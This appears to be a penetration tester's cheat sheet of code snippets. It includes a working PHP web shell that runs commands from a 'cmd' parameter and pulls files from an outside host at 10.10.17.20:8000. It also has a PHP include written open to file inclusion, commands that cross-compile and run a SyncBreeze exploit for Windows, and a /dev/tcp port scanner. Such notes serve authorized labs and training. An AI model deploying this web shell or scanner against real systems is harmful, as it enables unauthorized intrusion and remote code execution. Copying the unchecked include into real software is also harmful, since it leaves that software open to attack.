- RCE and RFI via PHP 
  ```php
    <?php 
      if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.17.20:8000/" . $_REQUEST['fupload']));
      }
      if (isset($_REQUEST['cmd'])){
        echo system($_REQUEST["cmd"]);
      }	
    ?>
  ```
- mkt script, to create a pentesting folder environment
  ```bash
    #!/bin/bash
    if [[ $# -eq 1 ]]; then
      mkdir -p $1/{nmap,content,exploits,scripts}
      exit 0
    else
      echo "The name of the folder is needed"
      exit 1
    fi
  ```
- Execute PHP from another file
  ```php
  <?php
      $file = $_GET["file"];
      include $file; ?>
    ```

- Compile **C** binaries with Windows dependences with **mingw-64**
  ```bash
  i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
  ```
  
- Run cross-compiled binary (binary compiled to run in Windows):
  ```bash
  wine exploit.exe
  ```
- Bash port scanning
```bash
#!/bin/bash
host=10.5.5.11
for port in {1..65535}; do
  timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
    echo "port $port is open"
done
echo "Done"
```
- Powershell Path

![image](https://user-images.githubusercontent.com/43812413/202171576-ac20e99c-2c35-430e-844c-bc12dcb1c05e.png)

  
